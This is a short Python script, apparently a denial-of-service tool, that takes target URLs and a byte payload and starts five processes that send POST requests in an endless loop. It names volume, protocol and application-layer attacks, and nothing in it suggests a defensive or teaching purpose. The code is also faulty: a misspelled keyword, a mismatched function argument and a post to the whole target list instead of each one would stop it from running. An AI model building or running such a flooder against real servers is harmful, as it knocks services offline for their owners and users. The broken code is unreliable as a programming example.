import requests as res
import multiprocessing

choices = ['volume based attack', 'protocol attack', 'application layer attack']


vector = input("target(targets):\n").split(" ")
bye = input("number of bytes: \n").encode()
#print(bye)

def http():
    while True:
        for i in vector:
            response = res.post(vector, data=bye, jason=None)
            print(response.text)
            
print("using post method to: ", vector)

processes = []

for i in range(5):
    p = multiprocessing.Process(target=http, args=(i,))
    processes.append(p)
    p.start()

# Wait for all processes to complete
for p in processes:
    p.join()
